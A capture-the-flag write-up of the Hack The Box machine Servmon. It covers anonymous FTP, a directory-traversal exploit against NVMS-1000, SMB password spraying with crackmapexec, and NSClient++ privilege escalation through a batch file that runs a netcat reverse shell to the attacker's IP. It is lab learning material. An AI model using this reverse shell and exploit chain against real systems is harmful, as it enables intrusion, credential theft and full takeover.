# Servmon

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.77
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 01:44 EDT
Nmap scan report for 10.129.227.77
Host is up (0.0077s latency).
Not shown: 65518 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

Loads of ports. This is an easy and old machine, so it shouldn't be too complex.

### Anonymous FTP

When I see FTP, the first thing I check for is anomymous logins. This works for this machine

```
$ ftp 10.129.227.77      
Connected to 10.129.227.77.
220 Microsoft FTP Service
Name (10.129.227.77:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49677|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
```

We can find 2 files, one `Confidential.txt` and a `Notes to do.txt`. Reading the confidential one highlights that there is a password file somewhere:

{% code overflow="wrap" %}
```
$ cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```
{% endcode %}

Great!&#x20;

### LFI

On port 80 and port 8443, there are HTTP and HTTPS sites presents respectively. Looking at port 80, we see this is running NVMS-1000:

<figure><img src="../../../.gitbook/assets/image (1740).png" alt=""><figcaption></figcaption></figure>

There are public exploits for these:

```
$ searchsploit nvms                     
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
NVMS 1000 - Directory Traversal                             | hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Modific | multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow          | multiple/dos/32193.txt
TVT NVMS 1000 - Directory Traversal                         | hardware/webapps/48311.py
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Following the PoC, we can see it works:

<figure><img src="../../../.gitbook/assets/image (637).png" alt=""><figcaption></figcaption></figure>

Great! Now, we can read the `password.txt` file that we found hints of earlier. Here are the passwords retrieved:

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

With this, we can run a `crackmapexec` to brute force the possible passwords.&#x20;

```
./cme smb 10.129.227.77 -u /home/kali/htb/servmon/users -p /home/kali/htb/servmon/passwords
SMB         10.129.227.77   445    SERVMON          [*] Windows 10.0 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE 
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.129.227.77   445    SERVMON          [-] ServMon\nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.129.227.77   445    SERVMON          [+] ServMon\nadine:L1k3B1gBut7s@W0rk
```

This would find that the credentials of `nadine:L1k3B1gBut7s@W0rk` is the right one. With these credentials, we can SSH into the machine as the `nmap` scan found earlier showed port 22 was open.

<figure><img src="../../../.gitbook/assets/image (529).png" alt=""><figcaption></figcaption></figure>

Then grab the user flag.

## Privilege Escalation

### NSClient++ Privilege Escalation

Earlier, I mentioned that port 8443 was running a HTTPS site and we have not enumerated it yet. This port had NSClient++ running on it:

<figure><img src="../../../.gitbook/assets/image (1983).png" alt=""><figcaption></figcaption></figure>

None of the functions work. Searching for public exploits works however:

```
$ searchsploit nsclient                     
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
NSClient++ 0.5.2.35 - Authenticated Remote Code Execution   | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation                  | windows/local/46802.txt
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

The Privilege Escalation is the one I need now. Following the PoC, we first need to grab the administrator password:

```
nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```

Then we need to download `nc.exe` to the machine and a `.bat` file that executes a reverse shell

```batch
@echo off
c:\Windows\Tasks\nc.exe 10.10.14.2 4444 -e cmd.exe
```

Then we need to login, but for some reason the application is blocking me. When we check the `nsclient.ini` configuration file, we see that it only allows `localhost` to access the services:

```
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini 
ï»¿# If you want to fill this file with all available options run the following command: 
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
```

So we need to do some port forwarding using `ssh`.&#x20;

```
ssh nadine@10.129.227.77 -L 8443:127.0.0.1:8443
```

Then we can access the site and continue.&#x20;

<figure><img src="../../../.gitbook/assets/image (1046).png" alt=""><figcaption></figcaption></figure>

Login using the administrator password we found earlier. There are automated PoCs for this:

{% embed url="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html" %}

We can run it like so after downloading the relevant files onto the machine:

```bash
python3 pe.py -t 127.0.0.1 -P 8443 -p 'ew2x6SsGTxjRwXOT' -c "c:\Windows\Tasks\evil.bat"
```

<figure><img src="../../../.gitbook/assets/image (3624).png" alt=""><figcaption></figcaption></figure>

Rooted!
